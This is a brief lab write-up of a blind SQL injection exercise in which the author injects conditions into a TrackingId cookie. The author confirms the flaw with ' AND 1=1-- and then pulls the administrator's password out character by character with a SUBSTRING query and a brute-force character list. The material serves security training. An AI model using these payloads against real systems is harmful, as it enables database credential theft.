Lab: Blind SQL injection with conditional responses

Looking for "Welcome back!" text in response. This confirms that query returned results

Sent request to repeater, and this value for Cookie returned the welcome back prompt:
Cookie: TrackingId=qFseZCsxVc45lK5G' AND 1=1--; session=EP7Qd8UQgzxg3PAnfl6xdBIQs4CLEhZZ

This shows that cookie is vulnerable to sql injection

Modified the cookie as so to begin creating the password of the administrator user:
Cookie: TrackingId=qFseZCsxVc45lK5G' AND SUBSTRING((SELECT password from users where username = 'administrator'), 1, 1) > 'a; session=EP7Qd8UQgzxg3PAnfl6xdBIQs4CLEhZZ

Sent to repeater and set "a" as a position. Used list of a-z, A-Z, and 0-9
After success, iterated over next character
